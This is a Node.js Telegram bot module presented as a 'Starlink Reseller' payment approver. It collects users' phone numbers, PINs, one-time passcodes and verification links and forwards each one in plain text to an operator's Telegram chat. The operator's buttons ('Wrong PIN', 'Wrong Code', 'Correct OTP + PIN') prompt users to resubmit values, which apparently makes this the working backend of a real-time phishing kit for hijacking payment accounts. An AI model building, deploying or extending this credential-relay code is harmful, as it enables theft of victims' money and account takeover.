require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const { default: TelegramBot } = require('node-telegram-bot-api');
const { auditLog } = require('./security');

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

let bot = null;
let botEnabled = false;

if (!token || token === 'your_bot_token_here') {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN not set in .env — Telegram bot is DISABLED.');
    console.warn('   Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID in .env to enable it.');
} else {
    try {
        bot = new TelegramBot(token, { polling: true });
        botEnabled = true;
        console.log('🤖 Telegram bot started successfully');
    } catch (err) {
        console.error('Failed to start Telegram bot:', err.message);
        console.error('🔧 Get a valid token from @BotFather on Telegram and update TELEGRAM_BOT_TOKEN in .env');
    }

    if (botEnabled && bot) {
        bot.on('polling_error', (err) => {
            console.error('Telegram polling error:', err.message || err);
            if (err.message && (err.message.includes('fetch failed') || err.message.includes('EFATAL'))) {
                console.error('🔧 This usually means the bot token is invalid or blocked. Get a new token from @BotFather.');
                botEnabled = false;
            }
        });

        bot.on('polling_reconnect', () => {
            console.warn('Telegram bot reconnecting...');
        });

        bot.on('webhook_error', (err) => {
            console.error('Telegram webhook error:', err.message || err);
        });
    }
}

// In-memory storage for approval requests
const approvals = new Map();
const OTP_TIMEOUT = 5 * 60 * 1000;

function generateRequestId() {
    return 'REQ-' + Date.now().toString(36).toUpperCase();
}

function cleanupExpired() {
    const now = Date.now();
    for (const [id, req] of approvals) {
        if ((req.status === 'phone_pin_verified' || req.status === 'otp_pending') && now - req.createdAt > OTP_TIMEOUT) {
            if (botEnabled && bot) {
                bot.sendMessage(req.userChatId || adminChatId, '⏰ Verification timeout. The OTP verification window has expired.');
                if (req.adminMessageId) {
                    bot.editMessageText('⏰ Verification timeout (5 minutes expired).', {
                        chat_id: adminChatId,
                        message_id: req.adminMessageId
                    }).catch(() => {});
                }
            }
            approvals.delete(id);
        }
    }
}

setInterval(cleanupExpired, 30000);

if (botEnabled && bot) {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, '🤖 Starlink Reseller Bot is running.\n\nI will notify you when a new payment approval is needed.');
        auditLog.write('BOT_COMMAND', { command: '/start', userId: msg.chat.id.toString() });
    });

    bot.onText(/\/status/, (msg) => {
        const pending = Array.from(approvals.values()).filter(r => r.status === 'pending').length;
        const phonePinVerified = Array.from(approvals.values()).filter(r => r.status === 'phone_pin_verified').length;
        const otpPending = Array.from(approvals.values()).filter(r => r.status === 'otp_pending').length;
        bot.sendMessage(msg.chat.id, `📊 Current status:\n• Pending: ${pending}\n• Phone/PIN verified: ${phonePinVerified}\n• OTP verification: ${otpPending}\n• Total: ${approvals.size}`);
        auditLog.write('BOT_COMMAND', { command: '/status', userId: msg.chat.id.toString() });
    });

    bot.onText(/\/clear/, (msg) => {
        if (msg.chat.id.toString() !== adminChatId) {
            bot.sendMessage(msg.chat.id, '❌ Only admin can use this command.');
            return;
        }
        approvals.clear();
        bot.sendMessage(msg.chat.id, '🗑️ All approval requests cleared.');
        auditLog.write('BOT_COMMAND', { command: '/clear', userId: msg.chat.id.toString() });
    });

    bot.on('callback_query', async (query) => {
        const data = query.data;
        const chatId = query.message.chat.id;

        if (chatId.toString() !== adminChatId) {
            await bot.answerCallbackQuery(query.id, { text: '❌ Only admin can approve/reject requests.' });
            auditLog.write('UNAUTHORIZED_CALLBACK', { userId: chatId.toString(), data });
            return;
        }

        const lastUnderscore = data.lastIndexOf('_');
        const action = data.substring(0, lastUnderscore);
        const requestId = data.substring(lastUnderscore + 1);

        const request = approvals.get(requestId);

        if (!request) {
            await bot.answerCallbackQuery(query.id, { text: '⚠️ Request not found or expired.' });
            auditLog.write('CALLBACK_NOT_FOUND', { adminId: chatId.toString(), action, requestId });
            return;
        }

        auditLog.logAdminAction(action, requestId, chatId.toString());

        if (action === 'approve') {
            request.status = 'phone_pin_verified';
            request.adminMessageId = query.message.message_id;

            const text = `✅ Phone & PIN Verified\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `User will now enter OTP. Waiting for OTP submission...`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ Phone/PIN verified - waiting for OTP' });

            if (request.onApproved) request.onApproved(requestId);

            request.timeoutTimer = setTimeout(() => {
                if (request.status === 'phone_pin_verified') {
                    request.status = 'timeout';
                    bot.sendMessage(chatId, `⏰ OTP verification timeout for request ${requestId}. The 5-minute window has expired.`);
                    if (request.onTimeout) request.onTimeout(requestId);
                }
            }, OTP_TIMEOUT);

        } else if (action === 'reject') {
            request.status = 'rejected';
            await bot.editMessageText(`❌ Payment Rejected\n\n📱 Phone: ${request.userPhone}\n📦 Package: ${request.package}\n💰 Amount: ${request.amount}\n\nThe user has been notified.`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });

            if (request.onRejected) request.onRejected(requestId);

        } else if (action === 'wrong_pin') {
            request.status = 'wrong_pin';
            delete request.verificationStep;

            const text = `❌ Wrong PIN\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The user has been notified to re-enter phone number and PIN.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN - user will re-enter phone/PIN' });

            if (request.onWrongPin) request.onWrongPin(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'wrong_otp') {
            request.status = 'wrong_otp';
            delete request.verificationStep;

            const text = `❌ Wrong OTP\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n` +
                `🔢 OTP: Wrong\n\n` +
                `The user has been notified to re-enter the OTP.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP - user will re-enter OTP' });

            if (request.onWrongOtp) request.onWrongOtp(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'otp_approve') {
            request.status = 'completed';
            delete request.verificationStep;

            const text = `✅ OTP Verified - Payment Complete!\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `🔢 OTP: Verified\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n` +
                `💳 Method: ${request.method}\n\n` +
                `The user has been approved and payment is complete.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ OTP verified - payment complete' });

            if (request.onVerified) request.onVerified(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'otp_invalid') {
            request.status = 'invalid';
            request.verificationStep = null;

            const text = `❌ Invalid OTP\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The OTP entered was incorrect. The user has been notified.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid OTP' });

            if (request.onInvalid) request.onInvalid(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'invalid') {
            request.status = 'invalid';
            await bot.editMessageText(`⚠️ Invalid Information\n\n📱 Phone: ${request.userPhone}\n📦 Package: ${request.package}\n\nPlease request the user to provide correct information.`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '⚠️ Invalid info requested' });

            if (request.onInvalid) request.onInvalid(requestId);
        } else if (action === 'link_approve') {
            request.status = 'completed';
            delete request.verificationStep;

            const text = `✅ Link Verified - Payment Complete!\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n` +
                `💳 Method: ${request.method}\n\n` +
                `The verification link has been approved and payment is complete.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - payment complete' });

            if (request.onVerified) request.onVerified(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'link_invalid') {
            request.status = 'invalid';
            request.verificationStep = null;

            const text = `❌ Invalid Link\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The verification link was incorrect. The user has been notified.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid link' });

            if (request.onInvalid) request.onInvalid(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);
        }
    });

    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text?.trim();

        if (!text || text.startsWith('/')) return;

        if (chatId.toString() !== adminChatId) {
            return;
        }

        let pendingRequest = null;
        for (const [id, req] of approvals) {
            if (req.verificationStep === 'awaiting_otp') {
                pendingRequest = { id, ...req };
                break;
            }
        }

        if (!pendingRequest) {
            return;
        }

        const enteredOtp = text;

        if (!/^\d{4,8}$/.test(enteredOtp)) {
            bot.sendMessage(chatId, '⚠️ Please enter a valid OTP (4-8 digits).\nExample: 123456');
            return;
        }

        if (enteredOtp !== pendingRequest.otp) {
            bot.sendMessage(chatId, `❌ Wrong OTP entered.\n\nExpected: ${pendingRequest.otp}\nReceived: ${enteredOtp}\n\nPlease try again.`);
            if (pendingRequest.onWrongOtp) pendingRequest.onWrongOtp(pendingRequest.id);
            return;
        }

        if (pendingRequest.timeoutTimer) {
            clearTimeout(pendingRequest.timeoutTimer);
        }

        pendingRequest.status = 'completed';
        delete pendingRequest.verificationStep;

        bot.sendMessage(chatId, `✅ Verification Successful!\n\n` +
            `📱 Phone: ${pendingRequest.userPhone}\n` +
            `🔑 PIN: Verified\n` +
            `🔢 OTP: Verified\n` +
            `📦 Package: ${pendingRequest.package}\n` +
            `💰 Amount: ${pendingRequest.amount}\n\n` +
            `The user has been approved and can proceed.`);

        if (pendingRequest.onVerified) pendingRequest.onVerified(pendingRequest.id);

        setTimeout(() => approvals.delete(pendingRequest.id), 30000);
    });
}

function createApprovalRequest(data) {
    const requestId = data.requestId || generateRequestId();
    const request = {
        id: requestId,
        userPhone: data.userPhone || 'N/A',
        userPin: data.userPin || 'N/A',
        package: data.package || 'N/A',
        amount: data.amount || 'N/A',
        method: data.method || 'N/A',
        otp: data.otp || null,
        status: 'pending',
        createdAt: Date.now(),
        verificationStep: null,
        onApproved: data.onApproved,
        onRejected: data.onRejected,
        onInvalid: data.onInvalid,
        onVerified: data.onVerified,
        onWrongPin: data.onWrongPin,
        onWrongOtp: data.onWrongOtp,
        onTimeout: data.onTimeout
    };

    approvals.set(requestId, request);

    if (botEnabled && bot) {
        const text = `🆕 New Payment Approval Request\n\n` +
            `📱 Phone: ${request.userPhone}\n` +
            `🔑 PIN: ${request.userPin}\n` +
            `📦 Package: ${request.package}\n` +
            `💰 Amount: ${request.amount}\n` +
            `💳 Method: ${request.method}\n\n` +
            `Please review and take action:`;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '✅ Allow Proceed', callback_data: `approve_${requestId}` },
                    { text: '❌ Invalid Information', callback_data: `invalid_${requestId}` }
                ]
            ]
        };

        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
            console.log('✅ Telegram approval message sent, message_id:', msg.message_id);
            request.adminMessageId = msg.message_id;
        }).catch((err) => {
            console.error('❌ Failed to send approval message:', err.message);
        });
    }

    return requestId;
}

function submitOtp(requestId, otp) {
    const request = approvals.get(requestId);
    if (!request) {
        return { success: false, message: 'Request not found' };
    }

    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending' && request.status !== 'wrong_otp') {
        return { success: false, message: 'Phone/PIN not verified yet' };
    }

    request.otp = otp;
    request.status = 'otp_pending';
    request.verificationStep = 'awaiting_otp';

    if (botEnabled && bot) {
        const text = `🔢 OTP Submitted\n\n` +
            `📱 Phone: ${request.userPhone}\n` +
            `📦 Package: ${request.package}\n` +
            `🔢 OTP: ${otp}\n\n` +
            `Please verify and take action:`;

        const keyboard = {
            inline_keyboard: [
                [{ text: '✅ Correct OTP + PIN', callback_data: `otp_approve_${requestId}` }],
                [{ text: '❌ Wrong PIN', callback_data: `wrong_pin_${requestId}` }],
                [{ text: '❌ Wrong Code', callback_data: `wrong_otp_${requestId}` }]
            ]
        };

        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
            request.adminOtpMessageId = msg.message_id;
        }).catch((err) => {
            console.error('Failed to send OTP notification:', err.message);
        });
    }

    return { success: true, message: 'OTP submitted for verification' };
}

function submitLink(requestId, link) {
    const request = approvals.get(requestId);
    if (!request) {
        return { success: false, message: 'Request not found' };
    }

    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending') {
        return { success: false, message: 'Phone/PIN not verified yet' };
    }

    request.otp = link;
    request.status = 'otp_pending';
    request.verificationStep = 'awaiting_otp';

    if (botEnabled && bot) {
        const cleanLink = (link || '').trim();
        const keyboard = {
            inline_keyboard: [
                [{ text: '🔗 Open Verification Link', url: cleanLink }],
                [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
            ]
        };
        bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
            `📱 Phone: ${request.userPhone}\n` +
            `📦 Package: ${request.package}\n` +
            `🔗 Link: ${cleanLink}\n\n` +
            `Please verify by clicking "Verify Link" and confirming.\n` +
            `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
            request.adminOtpMessageId = msg.message_id;
        }).catch((err) => {
            console.error('Failed to send link notification:', err.message);
        });
    }

    return { success: true, message: 'Link submitted for verification' };
}

function getApprovalStatus(requestId) {
    const request = approvals.get(requestId);
    if (!request) {
        return { status: 'not_found' };
    }
    return {
        status: request.status,
        userPhone: request.userPhone,
        package: request.package,
        amount: request.amount,
        method: request.method,
        otp: request.otp || null
    };
}

function sendNotification(message) {
    if (!botEnabled || !bot) return false;
    bot.sendMessage(adminChatId, message).then(() => {
        console.log('Notification sent to admin');
    }).catch((err) => {
        console.error('Failed to send notification:', err.message);
    });
    return true;
}

module.exports = {
    bot,
    createApprovalRequest,
    submitOtp,
    submitLink,
    getApprovalStatus,
    sendNotification,
    approvals
};
